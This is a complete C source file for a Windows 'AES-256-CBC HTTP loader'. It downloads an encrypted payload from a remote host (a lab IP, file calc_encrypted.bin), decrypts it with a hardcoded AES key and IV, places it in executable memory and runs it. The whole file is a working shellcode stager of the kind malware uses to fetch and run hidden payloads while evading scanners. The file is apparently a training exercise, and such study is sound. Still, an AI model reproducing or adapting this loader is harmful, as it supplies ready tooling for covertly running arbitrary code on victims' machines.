#include <Windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "aes.h"

#pragma comment(lib, "winhttp.lib")

#define BUFFER_SIZE 4096
#define USER_AGENT L"Mozilla/5.0"
#define AES_BLOCK_SIZE 16

typedef struct {
    PBYTE pData;
    DWORD dwSize;
    DWORD dwAllocated;
} DATA, * PDATA;

BOOL Download(LPCWSTR domain, INTERNET_PORT port, LPCWSTR path, PDATA pData)
{
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BYTE buffer[BUFFER_SIZE];
    DWORD bytesRead = 0;

    pData->pData = NULL;
    pData->dwSize = 0;
    pData->dwAllocated = BUFFER_SIZE * 16;

    pData->pData = (PBYTE)HeapAlloc(GetProcessHeap(), 0, pData->dwAllocated);
    if (!pData->pData) return FALSE;

    hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    hConnect = WinHttpConnect(hSession, domain, port, 0);
    if (!hConnect) goto cleanup;

    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) goto cleanup;

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0))
        goto cleanup;

    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    printf("[*] Downloading");
    while (WinHttpReadData(hRequest, buffer, BUFFER_SIZE, &bytesRead)) {
        if (bytesRead == 0) break;

        if (pData->dwSize + bytesRead > pData->dwAllocated) {
            DWORD newSize = pData->dwAllocated * 2;
            while (newSize < pData->dwSize + bytesRead) newSize *= 2;
            PBYTE newBuffer = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, pData->pData, newSize);
            if (!newBuffer) goto cleanup;
            pData->pData = newBuffer;
            pData->dwAllocated = newSize;
        }

        memcpy(pData->pData + pData->dwSize, buffer, bytesRead);
        pData->dwSize += bytesRead;
        printf(".");
    }

    printf("\n[+] Downloaded: %lu bytes\n", pData->dwSize);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    if (pData->pData) {
        HeapFree(GetProcessHeap(), 0, pData->pData);
        pData->pData = NULL;
    }
    return FALSE;
}

BOOL AesTinyDecrypt(PBYTE pCipherText, DWORD dwCipherSize, PBYTE pKey, PBYTE pIv, PBYTE* ppPlainText, PDWORD pdwPlainSize)
{
    struct AES_ctx ctx = { 0 };
    PBYTE pbPlainText = NULL;
    DWORD cbPlainText = 0x00;
    BYTE bPadLen = 0x00;
    BOOL bResult = FALSE;

    if (!pCipherText || !dwCipherSize || !pKey || !pIv || !ppPlainText || !pdwPlainSize)
        goto _END_OF_FUNC;

    if (dwCipherSize % AES_BLOCK_SIZE != 0)
        goto _END_OF_FUNC;

    if (!(pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwCipherSize)))
        goto _END_OF_FUNC;

    memcpy(pbPlainText, pCipherText, dwCipherSize);

    AES_init_ctx_iv(&ctx, pKey, pIv);

    printf("[*] Decrypting %lu bytes", dwCipherSize);
    AES_CBC_decrypt_buffer(&ctx, pbPlainText, dwCipherSize);
    printf("\n");

    bPadLen = pbPlainText[dwCipherSize - 1];
    if (bPadLen == 0 || bPadLen > AES_BLOCK_SIZE)
        goto _END_OF_FUNC;

    cbPlainText = dwCipherSize - bPadLen;

    *ppPlainText = pbPlainText;
    *pdwPlainSize = cbPlainText;
    bResult = TRUE;

_END_OF_FUNC:
    if (pbPlainText && !bResult)
        HeapFree(GetProcessHeap(), 0, pbPlainText);
    return bResult;
}

BOOL Execute(PBYTE pPayload, DWORD dwSize)
{
    PVOID exec = NULL;
    DWORD dwOldProtect = 0;

    printf("[*] Injecting into memory...\n");
    exec = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) {
        printf("[-] VirtualAlloc failed\n");
        return FALSE;
    }

    printf("[+] Memory: 0x%p\n", exec);
    memcpy(exec, pPayload, dwSize);
    printf("[+] Copied\n");

    if (!VirtualProtect(exec, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
        printf("[-] VirtualProtect failed\n");
        VirtualFree(exec, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[*] Executing...\n");
    ((void(*)())exec)();

    return TRUE;
}

int main(void)
{
    DATA dlData = { 0 };

    BYTE pKey[32] = {
         0xC7, 0x76, 0x74, 0xF3, 0x98, 0x63, 0x86, 0x0C, 0xDC, 0xC0, 0x98, 0x43, 0x7B, 0xF2, 0x32, 0xF3,
    0xA2, 0x8F, 0xB6, 0x80, 0x79, 0xAA, 0xF1, 0xE7, 0x6C, 0xFF, 0x14, 0x20, 0x6E, 0x16, 0x5D, 0xEE,
    };

    BYTE pIv[16] = {
      0x5A, 0xF0, 0x98, 0x33, 0xF7, 0x3D, 0xFC, 0xC4, 0x6F, 0xE1, 0xD3, 0x25, 0xAB, 0xAD, 0x28, 0x38,
    };

    PBYTE pDecrypted = NULL;
    DWORD dwDecryptedSize = 0;

    printf("============================================\n");
    printf("    AES-256-CBC HTTP LOADER (TINY-AES)\n");
    printf("============================================\n\n");

    printf("Downloading from remote server...\n");

    if (!Download(L"192.168.139.139", INTERNET_DEFAULT_PORT, L"/calc_encrypted.bin", &dlData)) {
        printf("[-] Download error\n");
        return 1;
    }

    printf("\nDecrypting AES-256-CBC...\n");
    if (!AesTinyDecrypt(dlData.pData, dlData.dwSize, pKey, pIv, &pDecrypted, &dwDecryptedSize)) {
        printf("[-] Decryption error\n");
        HeapFree(GetProcessHeap(), 0, dlData.pData);
        return 1;
    }

    printf("[+] Decrypted: %lu bytes\n", dwDecryptedSize);

    printf("\nExecuting...\n");
    Execute(pDecrypted, dwDecryptedSize);

    printf("\n[+] Finished\n");
    HeapFree(GetProcessHeap(), 0, dlData.pData);
    HeapFree(GetProcessHeap(), 0, pDecrypted);

    return 0;
}
